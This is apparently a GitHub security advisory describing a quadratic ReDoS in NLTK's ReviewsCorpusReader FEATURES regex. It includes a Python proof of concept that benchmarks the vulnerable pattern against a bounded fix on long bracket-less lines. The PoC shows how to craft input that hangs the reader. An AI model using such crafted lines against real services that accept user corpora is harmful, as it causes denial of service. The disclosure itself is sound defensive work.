# [H] Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex

## Summary
Severity: High
Advisory: GHSA-fg7f-2386-8897
CVE: CVE-2026-12061
CWE: CWE-1333
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-fg7f-2386-8897
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.10.0

## Details
### Summary
`ReviewsCorpusReader` extracts feature annotations of the form *label* followed by a bracketed signed digit (e.g. a label then `[+2]`) from each review line, using the module-level `FEATURES` regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal `[`. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs `reviews()`, `features()`, and `sents()`. 


### Details
The label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal `[`. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the *n* starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. `re.findall` repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.

### PoC
```
import multiprocessing as mp
import re
import time

# --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 ---
FEATURES_VULN = re.compile(r"((?:(?:\w+\s)+)?\w+)\[((?:\+|\-)\d)\]")

# --- Bounded variant from the fix (PR #3583): cap the per-label word run.
#     A generous bound (real feature labels are short noun phrases) makes the
#     run linear while never affecting legitimate corpora. ---
WORD_BOUND = 50
FEATURES_FIXED = re.compile(
    r"((?:(?:\w+\s){0,%d})?\w+)\[((?:\+|\-)\d)\]" % WORD_BOUND
)

TIMEOUT = 20.0  # seconds, per measurement
SIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line


def _bad_line(n_words):
    """A long line of plain words with NO trailing bracketed annotation."""
    return ("word " * n_words).rstrip()


def _worker(pattern_str, line, q):
    pat = re.compile(pattern_str)
    t0 = time.perf_counter()
    pat.findall(line)
    q.put(time.perf_counter() - t0)


def timed_findall(pattern, line, timeout=TIMEOUT):
    """Run pattern.findall(line) in a killable process; return seconds or None (timeout)."""
    q = mp.Queue()
    p = mp.Process(target=_worker, args=(pattern.pattern, line, q))
    p.start()
    p.join(timeout)
    if p.is_alive():
        p.terminate()
        p.join()
        return None
    return q.get() if not q.empty() else None


def bench(label, pattern):
    print(f"\n[{label}]  pattern: {pattern.pattern}")
    print(f"  {'words':>7} {'~bytes':>8}   {'time':>12}   {'x prev':>7}")
    prev = None
    for n in SIZES:
        line = _bad_line(n)
        t = timed_findall(pattern, line)
        if t is None:
            print(f"  {n:>7} {len(line):>8}   {'>%.0fs TIMEOUT' % TIMEOUT:>12}   {'--':>7}")
            prev = None
        else:
            ratio = f"{t/prev:.1f}x" if prev else "--"
            print(f"  {n:>7} {len(line):>8}   {t*1000:>9.1f} ms   {ratio:>7}")
            prev = t


def parity_check():
    """The bound must NOT change extraction on a realistic annotated line."""
    real = (
        "the picture quality[+2] and battery life[+1] are great but "
        "the lens cap[-1] feels cheap and the menu system[-2] is slow"
    )
    a = FEATURES_VULN.findall(real)
    b = FEATURES_FIXED.findall(real)
    print("\n[parity] realistic annotated line — extraction must be identical")
    print(f"  vulnerable regex -> {a}")
    print(f"  bounded   regex  -> {b}")
    print(f"  identical: {a == b}")
    return a == b


def main():
    print("=" * 66)
    print(" NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)")
    print("=" * 66)
    print(f" per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}")

    bench("VULNERABLE  reviews.py L70-71", FEATURES_VULN)
    bench("BOUNDED     fix #3583", FEATURES_FIXED)
    same = parity_check()

    print("\n" + "=" * 66)
    print(" Vulnerable: ~4x time per input doubling  => O(n^2) quadratic ReDoS")
    print(" Bounded:    ~2x time per input doubling  => O(n)   linear, stays in ms")
    print(f" Extraction parity on real annotations preserved: {same}")
    print(" A single ~100k-word bracket-less review line hangs reviews()/features()/sents().")
    print("=" * 66)


if __name__ == "__main__":
    main()
```

### Impact
Denial of service. Processing a single crafted line through `ReviewsCorpusReader` consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-fg7f-2386-8897
- https://github.com/nltk/nltk
